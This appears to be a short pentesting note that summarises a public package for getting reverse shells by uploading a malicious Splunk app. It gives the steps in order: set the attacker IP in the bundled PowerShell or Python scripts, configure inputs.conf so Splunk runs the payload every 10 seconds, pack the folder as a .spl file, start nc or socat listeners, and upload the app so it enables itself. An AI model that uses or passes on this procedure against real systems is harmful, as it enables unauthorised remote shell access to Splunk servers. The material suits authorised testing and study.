---
aliases:
tags:
source:
  - https://github.com/0xjpuff/reverse_shell_splunk
desc: A simple splunk package for obtaining reverse shells on both Windows and most *nix systems.
---

# usage

- `git clone https://github.com/0xjpuff/reverse_shell_splunk.git`
- update the target ip
	- windows modify the `/bin/run.ps1` to use the correct ip address
	- linux modify the `/bin/rev.py` to use the correct ip address
- `/default/inputs.conf` in this instance is the configuration file that tells splunk to launch the run.bat file and at what interval. In the example below "run.bat" will be run every 10 seconds. Because splunk only runs .bat files, the call inside "run.bat" is to a file with its same name. When run.bat is called, run.ps1 being in the same directory and having the same name will be run.
- tar files and rename to `.spl`
	- `tar -cvzf reverse_shell_splunk.tgz reverse_shell_splunk; mv reverse_shell_splunk.tgz reverse_shell_splunk.spl`
- launch listener
	- `nc -nlvp *port*`
	- `socat `tty`,raw,echo=0 tcp-listen:"port"`
- go to upload page
  ![[upload_app.png]]
- Upload and it will automatically be switched to enabled